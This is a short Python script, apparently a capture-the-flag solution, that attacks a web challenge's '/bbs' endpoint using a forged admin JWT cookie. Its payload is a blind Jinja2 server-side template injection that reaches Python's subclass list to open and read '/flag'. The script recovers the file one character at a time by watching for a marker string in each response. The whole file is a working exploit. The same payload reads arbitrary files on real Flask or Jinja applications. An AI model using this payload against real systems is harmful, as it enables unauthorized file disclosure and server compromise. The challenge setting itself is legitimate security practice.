import requests,sys
url = "http://cf43c17a16c94defa99a7a1703fb529e10b9604316cc4e58.game.ichunqiu.com/bbs"
cookie = {
    "token" : "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImFkbWluIn0.IXEkNe82X4vypUsNeRFbhbXU4KE4winxIhrPiWpOP30"
}
chars = "}-{0123456789abcdefghijklmnopqrstuvwxyz"
flag = ''
for i in range(0,50):
    for j in range(0,len(chars)):
        data = {
            "text" : "{%% if request.values.e[%d] == ()[request.values.a][request.values.b][request.values.c]()[40](request.values.d).read()[%d]%%}getflag{%%endif%%}" % (j,i),
            "a" : "__class__",
            "b" : "__base__",
            "c" : "__subclasses__",
            "d" : "/flag",
            "e" : chars
        }
        r = requests.post(url=url,data=data,cookies=cookie)
        if 'getflag' in r.text:
            flag += chars[j]
            sys.stdout.write("[+] "+ flag + '\r')
            sys.stdout.flush()
            if chars[j] == '}':
                print(flag)
                exit()
            else:
                break
print(len(r.text))
